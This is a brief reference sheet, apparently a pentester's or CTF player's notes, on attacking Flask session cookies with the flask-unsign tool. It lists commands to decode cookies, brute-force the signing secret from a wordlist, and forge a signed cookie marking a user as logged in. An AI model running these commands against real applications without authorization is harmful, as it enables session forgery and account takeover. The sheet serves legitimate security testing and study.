# Flask Session Cookies

---

## Install `flask-unsign` with Wordlist

```bash
pip3 install flask-unsign[wordlist]
```

---

## Decode and Inspect the JSON Contents of a Flask Session Cookie (No Secret Required)

```bash
flask-unsign --decode --cookie $FLASK_SESSION_COOKIE
```

---

## Decode and Inspect the JSON Contents of a Flask Session Cookie from a URL (No Secret Required)

```bash
flask-unsign --decode --server $URL
```

---

## Brute Force Flask Session Cookie's Secret

```bash
flask-unsign --unsign --cookie $FLASK_SESSION_COOKIE [--wordlist $PATH_TO_WORDLIST]
```

- There is a `--wordlist` default as long as `flask-unsign` was installed with the accompanying wordlist

---

## Sign a Flask Session Cookie (Requires Secret)

```bash
flask-unsign --sign --cookie "$COOKIE_CONTENTS" --secret $SECRET
```

- `$COOKIE_CONTENTS` is the string representation of a Python dictionary

Example:

```bash
$ flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME'
eyJsb2dnZWRfaW4iOnRydWV9.XDuW-g.cPCkFmmeB7qNIcN-ReiN72r0hvU
```

---

## References

[flask-unsign](https://pypi.org/project/flask-unsign/)
